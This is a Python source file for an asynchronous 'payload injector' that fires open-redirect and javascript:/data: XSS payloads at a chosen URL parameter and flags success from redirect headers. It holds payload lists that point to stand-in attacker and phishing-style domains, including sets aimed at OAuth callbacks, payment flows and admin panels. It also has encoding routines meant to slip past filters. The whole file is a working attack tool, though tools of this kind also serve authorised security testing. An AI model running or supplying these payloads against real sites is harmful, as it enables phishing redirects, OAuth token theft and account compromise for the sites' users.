#!/usr/bin/env python3
"""
🔥 PAYLOAD INJECTOR - Advanced Payload Injection Engine
"""

import asyncio
import random
from typing import List, Dict, Set, Optional, Tuple
from urllib.parse import urlencode, quote, unquote
from dataclasses import dataclass, field


@dataclass
class InjectionResult:
    """Payload injection result"""
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    response_headers: Dict[str, str]
    response_content: str
    is_successful: bool
    redirect_url: Optional[str] = None
    execution_time: float = 0.0
    error_message: Optional[str] = None


class PayloadInjector:
    """Advanced payload injection engine"""
    
    def __init__(self):
        # Complete payload arsenal - تمام payload های شما
        self.base_payloads = [
            "/%09/google.com",
            "/%2f%2fgoogle.com", 
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "////%09/google.com",
            "/////google.com",
            "////google.com/",
            "///google.com",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "https://google.com//",
            "〱google.com",
            "〵google.com", 
            "ゝgoogle.com",
            "ーgoogle.com",
            "ｰgoogle.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "//google.com",
            "//google.com/%2e%2e",
            "/http://google.com",
            "/https://google.com",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert(1)</script>",
            "//evil.com",
            "//attacker.com",
            "//malicious.com",
            "http://216.58.214.206",
            "http://0xd8.0x3a.0xd6.0xce",
            "//216.58.214.206",
            "//0xd8.0x3a.0xd6.0xce"
        ]
        
        # Web3/DeFi specific payloads
        self.web3_payloads = [
            "//fake-metamask.io",
            "//phishing-uniswap.org",
            "//malicious-compound.finance", 
            "//fake-aave.com",
            "//evil-yearn.finance",
            "//phishing-opensea.io",
            "//fake-rarible.com",
            "web3://malicious-contract.eth",
            "ipfs://QmMaliciousHash",
            "ens://hacker.eth",
            "ethereum://0x1234567890123456789012345678901234567890"
        ]
        
        # Context-specific payloads
        self.context_payloads = {
            'oauth': [
                "//evil.com/oauth/callback",
                "//attacker.com/login/success", 
                "javascript:confirm('OAuth Hijacked')"
            ],
            'payment': [
                "//fake-stripe.com",
                "//phishing-paypal.com",
                "//malicious-payment.com"
            ],
            'admin': [
                "//evil.com/admin/backdoor",
                "javascript:confirm('Admin Panel Compromised')",
                "//attacker.com/control"
            ]
        }
        
        # Encoding techniques
        self.encoding_methods = [
            self._url_encode,
            self._double_url_encode,
            self._unicode_encode,
            self._mixed_case,
            self._dot_decimal,
            self._hex_encode
        ]
    
    async def inject_payloads(self, target_url: str, parameter: str, payloads: List[str], 
                            session, method: str = 'GET') -> List[InjectionResult]:
        """Inject payloads into target parameter"""
        results = []
        
        print(f"[PAYLOAD-INJECTOR] Testing {len(payloads)} payloads on {parameter}")
        
        for i, payload in enumerate(payloads):
            print(f"\r[INJECTING] {i+1}/{len(payloads)}: {payload[:30]}...", end='')
            
            result = await self._inject_single_payload(
                target_url, parameter, payload, session, method
            )
            results.append(result)
            
            # Rate limiting
            await asyncio.sleep(0.1)
        
        print(f"\n[PAYLOAD-INJECTOR] Completed {len(results)} injections")
        return results
    
    async def _inject_single_payload(self, target_url: str, parameter: str, payload: str,
                                   session, method: str) -> InjectionResult:
        """Inject single payload"""
        import time
        start_time = time.time()
        
        try:
            # Construct test URL
            test_url = self._construct_test_url(target_url, parameter, payload, method)
            
            # Make request
            if method.upper() == 'POST':
                data = {parameter: payload}
                async with session.post(target_url, data=data, allow_redirects=False) as response:
                    response_content = await response.text()
                    execution_time = time.time() - start_time
                    
                    return InjectionResult(
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        method=method,
                        response_code=response.status,
                        response_headers=dict(response.headers),
                        response_content=response_content,
                        is_successful=self._is_successful_injection(response, payload),
                        redirect_url=response.headers.get('Location'),
                        execution_time=execution_time
                    )
            else:
                async with session.get(test_url, allow_redirects=False) as response:
                    response_content = await response.text()
                    execution_time = time.time() - start_time
                    
                    return InjectionResult(
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        method=method,
                        response_code=response.status,
                        response_headers=dict(response.headers),
                        response_content=response_content,
                        is_successful=self._is_successful_injection(response, payload),
                        redirect_url=response.headers.get('Location'),
                        execution_time=execution_time
                    )
        
        except Exception as e:
            execution_time = time.time() - start_time
            return InjectionResult(
                url=target_url,
                parameter=parameter,
                payload=payload,
                method=method,
                response_code=0,
                response_headers={},
                response_content="",
                is_successful=False,
                execution_time=execution_time,
                error_message=str(e)
            )
    
    def _construct_test_url(self, base_url: str, parameter: str, payload: str, method: str) -> str:
        """Construct test URL with payload"""
        if method.upper() == 'POST':
            return base_url  # Payload goes in POST data
        
        # For GET requests, add to URL
        separator = '&' if '?' in base_url else '?'
        encoded_payload = quote(payload, safe='')
        return f"{base_url}{separator}{parameter}={encoded_payload}"
    
    def _is_successful_injection(self, response, payload: str) -> bool:
        """Check if payload injection was successful"""
        # Check for redirect responses
        if response.status in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            if location:
                return self._is_successful_redirect(location, payload)
        
        # Check for JavaScript execution in response
        if 'javascript:' in payload.lower():
            # Look for signs that JavaScript would execute
            if response.status == 200:
                return True
        
        return False
    
    def _is_successful_redirect(self, location: str, payload: str) -> bool:
        """Check if redirect is successful"""
        location_lower = location.lower()
        payload_lower = payload.lower()
        
        # Test domains
        test_domains = [
            'google.com', 'evil.com', 'attacker.com', 'malicious.com',
            '216.58.214.206', 'fake-metamask.io', 'phishing-opensea.io'
        ]
        
        for domain in test_domains:
            if domain in location_lower or domain in payload_lower:
                return True
        
        # JavaScript execution
        if location_lower.startswith('javascript:'):
            return True
        
        # Data URLs
        if location_lower.startswith('data:'):
            return True
        
        return False
    
    def get_context_payloads(self, context: str) -> List[str]:
        """Get context-specific payloads"""
        context_specific = self.context_payloads.get(context, [])
        
        if context == 'web3':
            return self.web3_payloads + context_specific
        
        # Return base payloads + context specific
        return self.base_payloads[:20] + context_specific
    
    def encode_payloads(self, payloads: List[str]) -> List[str]:
        """Apply various encoding techniques to payloads"""
        encoded_payloads = []
        
        for payload in payloads:
            # Add original
            encoded_payloads.append(payload)
            
            # Add encoded versions
            for encoding_method in self.encoding_methods:
                try:
                    encoded = encoding_method(payload)
                    if encoded != payload:
                        encoded_payloads.append(encoded)
                except:
                    continue
        
        return list(set(encoded_payloads))  # Remove duplicates
    
    # Encoding methods
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return quote(payload, safe='')
    
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        return quote(quote(payload, safe=''), safe='')
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _mixed_case(self, payload: str) -> str:
        """Apply mixed case to payload"""
        result = ""
        for i, c in enumerate(payload):
            if c.isalpha():
                result += c.upper() if i % 2 == 0 else c.lower()
            else:
                result += c
        return result
    
    def _dot_decimal(self, payload: str) -> str:
        """Convert IP addresses to decimal format"""
        # Simple conversion for common IPs
        ip_map = {
            '216.58.214.206': '3627734734',
            '127.0.0.1': '2130706433'
        }
        
        for ip, decimal in ip_map.items():
            if ip in payload:
                return payload.replace(ip, decimal)
        
        return payload
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def get_successful_injections(self, results: List[InjectionResult]) -> List[InjectionResult]:
        """Get successful injection results"""
        return [r for r in results if r.is_successful]
    
    def generate_injection_report(self, results: List[InjectionResult]) -> Dict:
        """Generate injection report"""
        if not results:
            return {}
        
        successful = self.get_successful_injections(results)
        
        # Response code distribution
        code_dist = {}
        for result in results:
            code_dist[result.response_code] = code_dist.get(result.response_code, 0) + 1
        
        # Average execution time
        avg_time = sum(r.execution_time for r in results) / len(results)
        
        # Error analysis
        errors = [r for r in results if r.error_message]
        
        return {
            'summary': {
                'total_injections': len(results),
                'successful_injections': len(successful),
                'success_rate': (len(successful) / len(results)) * 100,
                'average_execution_time': avg_time,
                'errors': len(errors)
            },
            'response_code_distribution': code_dist,
            'successful_payloads': [
                {
                    'payload': r.payload,
                    'parameter': r.parameter,
                    'redirect_url': r.redirect_url,
                    'response_code': r.response_code
                }
                for r in successful
            ],
            'performance': {
                'fastest_injection': min(r.execution_time for r in results),
                'slowest_injection': max(r.execution_time for r in results),
                'total_time': sum(r.execution_time for r in results)
            }
        }